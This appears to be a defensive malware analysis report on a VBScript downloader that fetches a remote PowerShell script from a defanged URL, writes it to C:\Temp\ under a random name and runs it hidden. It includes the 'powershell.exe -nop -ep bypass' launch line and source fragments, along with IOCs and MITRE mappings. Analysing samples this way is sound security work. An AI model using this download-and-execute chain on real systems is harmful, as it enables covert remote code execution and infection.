---
title: "Malware Analysis: VBScript PowerShell Downloader (other · vbe · 206cfbab)"
published: 2026-11-05
draft: false
description: "Malicious (medium confidence): VBScript PowerShell Downloader · downloader/loader · difficulty easy · static analysis only"
tags: ["downloader", "loader"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-05-VBScript-PowerShell-Downloader-206cfbab"
---

> [!WARNING]
> **Verdict: Malicious** · Family **VBScript PowerShell Downloader** (uncertain) · Confidence **medium**
> 
> Aliases: VBS/PS1 Downloader, Twejamaica Loader
> 
> The sample is directly readable plaintext VBScript (3,131 bytes, no VBE encoding header). Its PayloadPipeline class implements a complete download-drop-execute chain: a hardcoded HTTPS address, a GET download of 21.ps1 via MSXML2.XMLHTTP, writing the response body to a randomly named .ps1 under C:\Temp\, and launching powershell.exe through WScript.Shell.Run with a hidden window and -nop -ep bypass. The behavior of downloading and executing a remote script is directly visible in the source, so it is judged a malicious downloader/loader.

## Overview

| Item | Content |
|:--|:--|
| Family | **VBScript PowerShell Downloader** · aliases VBS/PS1 Downloader, Twejamaica Loader · _uncertain_ |
| Confidence | **medium** |
| Behavior class | downloader · loader |
| Difficulty | easy |
| First seen | 2026-11-04 15:57:51 |
| Analysis method | Static analysis only |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/206cfbabb6175852a80ccfff9884e6019a39d712de6c198a3ac43e4e4e9f9c45/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Hardcoded download URL</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Create staging directory</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1074.001</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Fetch PS1 payload over HTTP</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Drop randomly named script</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Launch PowerShell hidden</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1059.001</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identity

| Item | Value |
|:--|:--|
| SHA-256 | `206cfbabb6175852a80ccfff9884e6019a39d712de6c198a3ac43e4e4e9f9c45` |
| MD5 | _not recorded_ |
| Size | 3,131 bytes (3.1 KB) |
| Type | other · `vbe` |

## Behavior analysis

**6** behaviors in total, each backed by evidence, and all are statically recoverable.

### 1. Hardcoded download URL

`T1071.001` · Confidence **high** · static

In Class_Initialize it fixes the remote payload address to hxxps://twejamaica[.]org/aSUqKxqx/21[.]ps1, using HTTPS port 443.

> **Evidence**: source offset 192: m_url = "hxxps://twejamaica[.]org/aSUqKxqx/21.ps1"
> 
> **Source**: `ev-000001` · `ev-000002`

### 2. Create staging directory

`T1074.001` · Confidence **high** · static

Through Scripting.FileSystemObject it checks for and creates C:\Temp\ as the staging location for the downloaded script.

> **Evidence**: source offset 984: m_fs.CreateFolder m_stageDir (m_stageDir="C:\Temp\")
> 
> **Source**: `ev-000001` · `ev-000002`

### 3. Fetch PS1 payload over HTTP

`T1105` · Confidence **high** · static

It issues a synchronous GET request to the hardcoded URL with MSXML2.XMLHTTP and continues only when Status=200 is returned.

> **Evidence**: source offset 1566: m_http.Open "GET", m_url, False; offset 1803: If m_http.Status = 200
> 
> **Source**: `ev-000001` · `ev-000002`

### 4. Drop randomly named script

`T1105` · Confidence **high** · static

It writes the HTTP response body ResponseText to C:\Temp\<8 uppercase random letters>.ps1, with the file name generated dynamically via Randomize/Rnd to evade fixed-name detection.

> **Evidence**: source offset 1273 builds the trigger path; offset 1861 CreateTextFile; offset 1925 out.Write m_http.ResponseText
> 
> **Source**: `ev-000001` · `ev-000002`

### 5. Launch PowerShell hidden

`T1059.001` · Confidence **high** · static

Through WScript.Shell.Run it executes powershell.exe -nop -ep bypass -file <payload> with window style 0 (hidden window) and waits for the process to finish.

> **Evidence**: source offset 1331 builds the command line; offset 2244: m_shell.Run m_launchCmd, 0, True
> 
> **Source**: `ev-000001` · `ev-000002`

### 6. Bypass execution policy

`T1562.001` · Confidence **high** · static

The command line uses -nop (NoProfile) and -ep bypass (ExecutionPolicy Bypass), disabling profile loading and bypassing the PowerShell execution policy restriction.

> **Evidence**: source offset 1331: "powershell.exe -nop -ep bypass -file """ & m_payloadPath
> 
> **Source**: `ev-000001` · `ev-000002`


## IOC (defanged)

### Network

:::caution
**Pending dynamic verification**: the addresses above come from static analysis; no successful connection or session was observed under the isolated analysis network, so the real C2 responses and payloads remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://twejamaica[.]org/aSUqKxqx/21[.]ps1` | 443 | download | static | ⏳ not observed |

### Host

**Dropped paths**

- `C:\Temp\`
- `C:\Temp\<8 uppercase letters>.ps1`

### Config

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `twejamaica[.]org` | yes | static |
| `download_url` | `hxxps://twejamaica[.]org/aSUqKxqx/21[.]ps1` | yes | static |
| `stage_dir` | `C:\Temp\` | yes | static |
| `payload_filename_pattern` | `8 uppercase random letters + .ps1 (generated by Randomize/Rnd)` | yes | static |
| `launch_command` | `powershell.exe -nop -ep bypass -file "<payload>", window style 0` | yes | static |
| `encryption_algo` | `-` | no | static |

## What not to claim

:::important
The following conclusions are **easy to misjudge**; keep them in mind when citing this report.

- Do not judge it an encoded or encrypted VBE file because of the .vbe extension: the content is plaintext VBScript beginning with Option Explicit and contains no #@~^ encoding header.
- Do not assert the final payload is ransomware, a stealer, a RAT or a miner: the remote 21.ps1 was not retrieved or executed, and its subsequent function is unknown.
- Do not claim registry, service, scheduled-task, mutex or autostart persistence: the source's Finish is empty, and no persistence or self-deletion calls were seen.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Static analysis only |
| Unpacking | no |

**Limitations and pending verification**

1. Static analysis only; the sample was not executed in a sandbox, and no actual network request, file drop or PowerShell child process was observed.
2. The second stage hxxps://twejamaica[.]org/aSUqKxqx/21[.]ps1 was not downloaded, so its real function, final family or later C2 cannot be determined.
3. The configuration and C2 were statically extracted from the source and have not been verified through dynamic network traffic; if the domain/path is no longer valid, the actual behavior may not be reproducible.
4. The sample has no persistence code; whether it is a one-shot downloader depends on the unrestored second-stage payload.

## Evidence index

<details>
<summary>Expand 2 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | string extraction | Extracted 101 ASCII strings, including the hardcoded URL, the C:\Temp\ staging path, MSXML2.XMLHTTP/WScript.Shell/FileSystemObject object names and the powershell.exe -nop -ep bypass command line. |
| `ev-000002` | evidence.record | Reviewed the plaintext VBScript source line by line, recording PayloadPipeline's download, drop and hidden-launch flow, plus the no-persistence/no-cleanup conclusion. |

</details>

---

_This report's sample is not public; IOCs are defanged and for security research only._
